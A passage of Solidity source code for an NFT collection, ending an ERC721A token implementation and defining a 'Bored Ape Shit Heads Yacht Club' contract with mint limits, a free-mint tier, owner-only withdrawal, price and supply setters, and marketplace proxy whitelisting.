1086             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1087 
1088             uint256 updatedIndex = startTokenId;
1089             uint256 end = updatedIndex + quantity;
1090 
1091             if (safe && to.isContract()) {
1092                 do {
1093                     emit Transfer(address(0), to, updatedIndex);
1094                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1095                         revert TransferToNonERC721ReceiverImplementer();
1096                     }
1097                 } while (updatedIndex != end);
1098                 // Reentrancy protection
1099                 if (_currentIndex != startTokenId) revert();
1100             } else {
1101                 do {
1102                     emit Transfer(address(0), to, updatedIndex++);
1103                 } while (updatedIndex != end);
1104             }
1105             _currentIndex = updatedIndex;
1106         }
1107         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1108     }
1109 
1110     /**
1111      * @dev Transfers `tokenId` from `from` to `to`.
1112      *
1113      * Requirements:
1114      *
1115      * - `to` cannot be the zero address.
1116      * - `tokenId` token must be owned by `from`.
1117      *
1118      * Emits a {Transfer} event.
1119      */
1120     function _transfer(
1121         address from,
1122         address to,
1123         uint256 tokenId
1124     ) private {
1125         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1126 
1127         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1128             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1129             getApproved(tokenId) == _msgSender());
1130 
1131         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1132         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1133         if (to == address(0)) revert TransferToZeroAddress();
1134 
1135         _beforeTokenTransfers(from, to, tokenId, 1);
1136 
1137         // Clear approvals from the previous owner
1138         _approve(address(0), tokenId, prevOwnership.addr);
1139 
1140         // Underflow of the sender's balance is impossible because we check for
1141         // ownership above and the recipient's balance can't realistically overflow.
1142         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1143         unchecked {
1144             _addressData[from].balance -= 1;
1145             _addressData[to].balance += 1;
1146 
1147             _ownerships[tokenId].addr = to;
1148             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1149 
1150             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1151             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1152             uint256 nextTokenId = tokenId + 1;
1153             if (_ownerships[nextTokenId].addr == address(0)) {
1154                 // This will suffice for checking _exists(nextTokenId),
1155                 // as a burned slot cannot contain the zero address.
1156                 if (nextTokenId < _currentIndex) {
1157                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1158                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1159                 }
1160             }
1161         }
1162 
1163         emit Transfer(from, to, tokenId);
1164         _afterTokenTransfers(from, to, tokenId, 1);
1165     }
1166 
1167     /**
1168      * @dev Destroys `tokenId`.
1169      * The approval is cleared when the token is burned.
1170      *
1171      * Requirements:
1172      *
1173      * - `tokenId` must exist.
1174      *
1175      * Emits a {Transfer} event.
1176      */
1177     function _burn(uint256 tokenId) internal virtual {
1178         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1179 
1180         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1181 
1182         // Clear approvals from the previous owner
1183         _approve(address(0), tokenId, prevOwnership.addr);
1184 
1185         // Underflow of the sender's balance is impossible because we check for
1186         // ownership above and the recipient's balance can't realistically overflow.
1187         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1188         unchecked {
1189             _addressData[prevOwnership.addr].balance -= 1;
1190             _addressData[prevOwnership.addr].numberBurned += 1;
1191 
1192             // Keep track of who burned the token, and the timestamp of burning.
1193             _ownerships[tokenId].addr = prevOwnership.addr;
1194             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1195             _ownerships[tokenId].burned = true;
1196 
1197             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1198             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1199             uint256 nextTokenId = tokenId + 1;
1200             if (_ownerships[nextTokenId].addr == address(0)) {
1201                 // This will suffice for checking _exists(nextTokenId),
1202                 // as a burned slot cannot contain the zero address.
1203                 if (nextTokenId < _currentIndex) {
1204                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1205                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1206                 }
1207             }
1208         }
1209 
1210         emit Transfer(prevOwnership.addr, address(0), tokenId);
1211         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1212 
1213         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1214         unchecked {
1215             _burnCounter++;
1216         }
1217     }
1218 
1219     /**
1220      * @dev Approve `to` to operate on `tokenId`
1221      *
1222      * Emits a {Approval} event.
1223      */
1224     function _approve(
1225         address to,
1226         uint256 tokenId,
1227         address owner
1228     ) private {
1229         _tokenApprovals[tokenId] = to;
1230         emit Approval(owner, to, tokenId);
1231     }
1232 
1233     /**
1234      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1235      *
1236      * @param from address representing the previous owner of the given token ID
1237      * @param to target address that will receive the tokens
1238      * @param tokenId uint256 ID of the token to be transferred
1239      * @param _data bytes optional data to send along with the call
1240      * @return bool whether the call correctly returned the expected magic value
1241      */
1242     function _checkContractOnERC721Received(
1243         address from,
1244         address to,
1245         uint256 tokenId,
1246         bytes memory _data
1247     ) private returns (bool) {
1248         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1249             return retval == IERC721Receiver(to).onERC721Received.selector;
1250         } catch (bytes memory reason) {
1251             if (reason.length == 0) {
1252                 revert TransferToNonERC721ReceiverImplementer();
1253             } else {
1254                 assembly {
1255                     revert(add(32, reason), mload(reason))
1256                 }
1257             }
1258         }
1259     }
1260 
1261     /**
1262      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1263      * And also called before burning one token.
1264      *
1265      * startTokenId - the first token id to be transferred
1266      * quantity - the amount to be transferred
1267      *
1268      * Calling conditions:
1269      *
1270      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1271      * transferred to `to`.
1272      * - When `from` is zero, `tokenId` will be minted for `to`.
1273      * - When `to` is zero, `tokenId` will be burned by `from`.
1274      * - `from` and `to` are never both zero.
1275      */
1276     function _beforeTokenTransfers(
1277         address from,
1278         address to,
1279         uint256 startTokenId,
1280         uint256 quantity
1281     ) internal virtual {}
1282 
1283     /**
1284      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1285      * minting.
1286      * And also called after one token has been burned.
1287      *
1288      * startTokenId - the first token id to be transferred
1289      * quantity - the amount to be transferred
1290      *
1291      * Calling conditions:
1292      *
1293      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1294      * transferred to `to`.
1295      * - When `from` is zero, `tokenId` has been minted for `to`.
1296      * - When `to` is zero, `tokenId` has been burned by `from`.
1297      * - `from` and `to` are never both zero.
1298      */
1299     function _afterTokenTransfers(
1300         address from,
1301         address to,
1302         uint256 startTokenId,
1303         uint256 quantity
1304     ) internal virtual {}
1305 }
1306 
1307 
1308 
1309 contract BoredApeShitHeadsYachtClub is ERC721A, Owneable {
1310     string public baseURI = "https://boredapeshitheads.xyz/BoredApeShitHeadsJson/";
1311     string public contractURI = "https://boredapeshitheads.xyz/Contract/Contract-BASHYC.json";
1312     string public constant baseExtension = ".json";
1313     address public constant proxyRegistryAddress = 0x43B42b17bab13B79679CE1dfA3f706831EE96F72;
1314 
1315     uint256 public constant MAX_PER_TX_FREE = 2;
1316     uint256 public constant FREE_MAX_SUPPLY = 5000;
1317     uint256 public constant MAX_PER_TX = 20;
1318     uint256 public MAX_SUPPLY = 5000;
1319     uint256 public price = 0.005 ether;
1320 
1321     bool public paused = true;
1322 
1323     constructor() ERC721A("Bored Ape Shit Heads Yacht Club", "BASHYC") {}
1324 
1325     function mint(uint256 _amount) external payable {
1326         address _caller = _msgSender();
1327         require(!paused, "Paused");
1328         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1329         require(_amount > 0, "No 0 mints");
1330         require(tx.origin == _caller, "No contracts");
1331         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1332         
1333       if(FREE_MAX_SUPPLY >= totalSupply()){
1334             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1335         }else{
1336             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1337             require(_amount * price == msg.value, "Invalid funds provided");
1338         }
1339 
1340 
1341         _safeMint(_caller, _amount);
1342     }
1343 
1344     function isApprovedForAll(address owner, address operator)
1345         override
1346         public
1347         view
1348         returns (bool)
1349     {
1350         // Whitelist OpenSea proxy contract for easy trading.
1351         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1352         if (address(proxyRegistry.proxies(owner)) == operator) {
1353             return true;
1354         }
1355 
1356         return super.isApprovedForAll(owner, operator);
1357     }
1358 
1359     function withdraw() external onlyOwner {
1360         uint256 balance = address(this).balance;
1361         (bool success, ) = _msgSender().call{value: balance}("");
1362         require(success, "Failed to send");
1363     }
1364 
1365     function config() external onlyOwner {
1366         _safeMint(_msgSender(), 1);
1367     }
1368 
1369     function pause(bool _state) external onlyOwner {
1370         paused = _state;
1371     }
1372 
1373     function setBaseURI(string memory baseURI_) external onlyOwner {
1374         baseURI = baseURI_;
1375     }
1376 
1377     function setContractURI(string memory _contractURI) external onlyOwner {
1378         contractURI = _contractURI;
1379     }
1380 
1381     function setPrice(uint256 newPrice) public onlyOwner {
1382         price = newPrice;
1383     }
1384 
1385     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1386         MAX_SUPPLY = newSupply;
1387     }
1388 
1389     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1390         require(_exists(_tokenId), "Token does not exist.");
1391         return bytes(baseURI).length > 1 ? string(
1392             abi.encodePacked(
1393               baseURI,
1394               Strings.toString(_tokenId),
1395               baseExtension
1396             )
1397         ) : "";
1398     }
1399 }
1400 
1401 contract OwnableDelegateProxy { }
1402 contract ProxyRegistry {
1403     mapping(address => OwnableDelegateProxy) public proxies;
1404 }